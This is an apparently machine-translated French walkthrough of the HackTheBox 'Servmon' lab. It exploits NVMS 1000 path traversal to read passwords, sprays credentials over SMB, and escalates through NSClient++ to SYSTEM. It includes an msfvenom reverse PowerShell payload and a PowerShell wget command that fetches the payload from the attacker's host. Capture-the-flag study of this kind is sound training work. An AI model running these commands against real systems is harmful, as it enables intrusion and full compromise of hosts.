HackTheBox. Passage de Servmon. Exploiter les vulnérabilités dans NVMS et NSClient ++







Je continue de publier des solutions envoyées pour un traitement ultérieur des machines à partir du site HackTheBox .



La connexion au laboratoire se fait via VPN. Il est recommandé de ne pas vous connecter à partir d'un ordinateur professionnel ou d'un hôte où les données importantes pour vous sont disponibles, car vous vous retrouvez sur un réseau privé avec des personnes qui connaissent quelque chose dans le domaine de la sécurité de l'information.

Recon



Cette machine a une adresse IP 10.10.10.184, que j'ajoute à / etc / hosts. 



10.10.10.184    servmon.htb


Tout d'abord, nous analysons les ports ouverts. Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. Nous analysons tous les ports TCP et UDP à partir de l'interface tun0 à une vitesse de 500 paquets par seconde. 



masscan -e tun0 -p1-65535,U:1-65535 10.10.10.184    --rate=500






L'hôte a de nombreux ports ouverts. Maintenant, scannez-les avec nmap pour filtrer et sélectionnez ceux dont vous avez besoin. 



nmap servmon.htb -p21,80,49667,49669,22,139,49668,8443,49670,6699,6063,49666,5666,5040,7680,49664,49665,445,135






Maintenant, pour des informations plus détaillées sur les services qui fonctionnent sur les ports, nous allons exécuter une analyse avec l'option -A. 



nmap -A servmon.htb -p21,80,22,139,8443,6699,6063,5666,5040,7680,445,135






Comme le montre l'analyse nmap, il est possible de travailler avec un serveur FTP au nom d'anonymes. Nous entrons et regardons autour de nous.







Il y a deux fichiers, téléchargeons-les et voyons.











UTILISATEUR



Ainsi, nous voyons une liste de tâches (certaines d'entre elles ne sont pas terminées), et nous savons également que le fichier avec le mot de passe est sur le bureau. Jetez maintenant un œil au Web.







Jetons un coup d'œil aux exploits pour NVMS.







Et nous le trouvons pour le NVMS 1000. Nous découvrons de quoi il s'agit.







Autrement dit, nous pouvons lire des fichiers dans le système lors de l'accès via HTTP 1.1. Allons vérifier.







Tout fonctionne. Nous savons où se trouve le mot de passe. Voyons voir.







Et nous obtenons quelques mots de passe. Nous avons donc plusieurs services où nous pouvons trier les paires login: mot de passe. Je l'ai fait sur smb en utilisant CrackMapExec.







Connectez-vous via SSH et obtenez le drapeau utilisateur.







RACINE



Inspectant les services fournis par nmap, NSClient s'exécute sur le port 8443.







Et pour lui aussi, nous trouvons un exploit.







Ainsi, les utilisateurs locaux disposant de faibles privilèges peuvent lire le mot de passe de l'administrateur Web en texte clair dans le fichier de configuration.

Étant donné que le service NSClient ++ s'exécute en tant que système, un utilisateur avec un niveau de privilège bas peut recevoir une élévation de privilèges.

La première étape consiste à obtenir le mot de passe de l'administrateur Web.

type "c:\program files\nsclient++\nsclient.ini"











Nous voyons l'hôte autorisé - localhost. Obtenons le port SHH.

ssh -L 8444:127.0.0.1:8443 nadine@servmon.htb





Pour cette vulnérabilité, afin de ne pas terminer toutes les actions manuellement, j'ai utilisé un exploit RCE automatisé .



Tout d'abord, nous générons la charge que nous allons effectuer pour la connexion inverse et exécutons l'écouteur. 



msfvenom -p cmd/windows/reverse_powershell lhost=10.10.15.60 lport=4321 > ./1.bat






Maintenant sur l'hôte distant, téléchargez le fichier bat donné depuis la machine locale. 



powershell -c "wget http://10.10.15.60:88/1.bat -O C:\Temp\a.bat"


Lorsque tout est prêt, nous lançons l'exploit (soit l'exploit est instable, soit la machine, mais elle n'a été exécutée avec succès que la troisième fois).







Et dans le métasplit, nous observons la création réussie de la session.







Nous avons les droits système sur cette machine!
